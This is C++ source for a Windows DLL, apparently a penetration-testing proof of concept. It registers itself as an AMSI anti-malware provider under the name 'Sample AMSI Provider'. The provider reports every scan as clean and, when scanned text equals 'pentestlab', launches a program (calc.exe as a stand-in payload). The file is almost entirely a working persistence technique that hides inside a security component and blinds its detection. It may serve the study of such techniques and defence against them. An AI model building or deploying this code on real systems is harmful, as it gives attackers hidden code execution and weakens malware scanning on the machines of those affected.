#include "stdafx.h"
#include <process.h>
#include <subauth.h>
#include <strsafe.h>
#include <amsi.h>
#include <windows.h>
#include <wrl/module.h>

using namespace Microsoft::WRL;

HMODULE g_currentModule;

typedef void (NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
	PUNICODE_STRING String1,
	PUNICODE_STRING String2,
	BOOLEAN CaseInsetive
	);

DWORD WINAPI MyThreadFunction(LPVOID lpParam);
void ErrorHandler(LPTSTR lpszFunction);

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
{
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		g_currentModule = module;
		DisableThreadLibraryCalls(module);
		Module<InProc>::GetModule().Create();
		break;

	case DLL_PROCESS_DETACH:
		Module<InProc>::GetModule().Terminate();
		break;
	}
	return TRUE;
}

#pragma region COM server boilerplate
HRESULT WINAPI DllCanUnloadNow()
{
	return Module<InProc>::GetModule().Terminate() ? S_OK : S_FALSE;
}

STDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_ LPVOID FAR* ppv)
{
	return Module<InProc>::GetModule().GetClassObject(rclsid, riid, ppv);
}
#pragma endregion

class
	DECLSPEC_UUID("2E5D8A62-77F9-4F7B-A90C-2744820139B2")
	PentestlabAmsiProvider : public RuntimeClass<RuntimeClassFlags<ClassicCom>, IAntimalwareProvider, FtmBase>
{
public:
	IFACEMETHOD(Scan)(_In_ IAmsiStream * stream, _Out_ AMSI_RESULT * result) override;
	IFACEMETHOD_(void, CloseSession)(_In_ ULONGLONG session) override;
	IFACEMETHOD(DisplayName)(_Outptr_ LPWSTR * displayName) override;

private:
	LONG m_requestNumber = 0;
};


HRESULT PentestlabAmsiProvider::Scan(_In_ IAmsiStream* stream, _Out_ AMSI_RESULT* result)
{
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");

	UNICODE_STRING myTriggerString1;
	RtlInitUnicodeString(&myTriggerString1, L"pentestlab");

	UNICODE_STRING myTriggerString2;
	RtlInitUnicodeString(&myTriggerString2, L"\"pentestlab\"");

	UNICODE_STRING myTriggerString3;
	RtlInitUnicodeString(&myTriggerString3, L"'pentestlab'");

	ULONG actualSize;
	ULONGLONG contentSize;
	if (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_SIZE, sizeof(ULONGLONG), reinterpret_cast<PBYTE>(&contentSize), &actualSize)) &&
		actualSize == sizeof(ULONGLONG))
	{
		*result = AMSI_RESULT_NOT_DETECTED;

		return S_OK;
	}

	PBYTE contentAddress;
	if (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_ADDRESS, sizeof(PBYTE), reinterpret_cast<PBYTE>(&contentAddress), &actualSize)) &&
		actualSize == sizeof(PBYTE))
	{
		*result = AMSI_RESULT_NOT_DETECTED;

		return S_OK;
	}


	if (contentAddress)
	{
		if (contentSize < 50)
		{
			UNICODE_STRING myuni;
			myuni.Buffer = (PWSTR)contentAddress;
			myuni.Length = (USHORT)contentSize;
			myuni.MaximumLength = (USHORT)contentSize;

			if (RtlEqualUnicodeString(&myTriggerString1, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString2, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString3, &myuni, TRUE))
			{

				DWORD thId;
				CreateThread(NULL, 0, MyThreadFunction, NULL, 0, &thId);
			}
		}
	}

	*result = AMSI_RESULT_NOT_DETECTED;

	return S_OK;
}

void PentestlabAmsiProvider::CloseSession(_In_ ULONGLONG session)
{

}

HRESULT PentestlabAmsiProvider::DisplayName(_Outptr_ LPWSTR* displayName)
{
	*displayName = const_cast<LPWSTR>(L"Sample AMSI Provider");
	return S_OK;
}

CoCreatableClass(PentestlabAmsiProvider);

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	system("c:\\Windows\\System32\\calc.exe");

	return 0;
}


#pragma region Install / uninstall

HRESULT SetKeyStringValue(_In_ HKEY key, _In_opt_ PCWSTR subkey, _In_opt_ PCWSTR valueName, _In_ PCWSTR stringValue)
{
	LONG status = RegSetKeyValue(key, subkey, valueName, REG_SZ, stringValue, (wcslen(stringValue) + 1) * sizeof(wchar_t));
	return HRESULT_FROM_WIN32(status);
}

STDAPI DllRegisterServer()
{
	wchar_t modulePath[MAX_PATH];
	if (GetModuleFileName(g_currentModule, modulePath, ARRAYSIZE(modulePath)) >= ARRAYSIZE(modulePath))
	{
		return E_UNEXPECTED;
	}

	wchar_t clsidString[40];
	if (StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)
	{
		return E_UNEXPECTED;
	}

	wchar_t keyPath[200];
	HRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L"PentestlabAmsiProvider");
	if (FAILED(hr)) return hr;

	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls\\InProcServer32", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, modulePath);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, L"ThreadingModel", L"Both");
	if (FAILED(hr)) return hr;

	// Register this CLSID as an anti-malware provider.
	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Microsoft\\AMSI\\Providers\\%ls", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L"PentestlabAmsiProvider");
	if (FAILED(hr)) return hr;

	return S_OK;
}

STDAPI DllUnregisterServer()
{
	wchar_t clsidString[40];
	if (StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)
	{
		return E_UNEXPECTED;
	}

	// Unregister this CLSID as an anti-malware provider.
	wchar_t keyPath[200];
	HRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Microsoft\\AMSI\\Providers\\%ls", clsidString);
	if (FAILED(hr)) return hr;
	LONG status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
	if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

	// Unregister this CLSID as a COM server.
	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls", clsidString);
	if (FAILED(hr)) return hr;
	status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
	if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

	return S_OK;
}
#pragma endregion
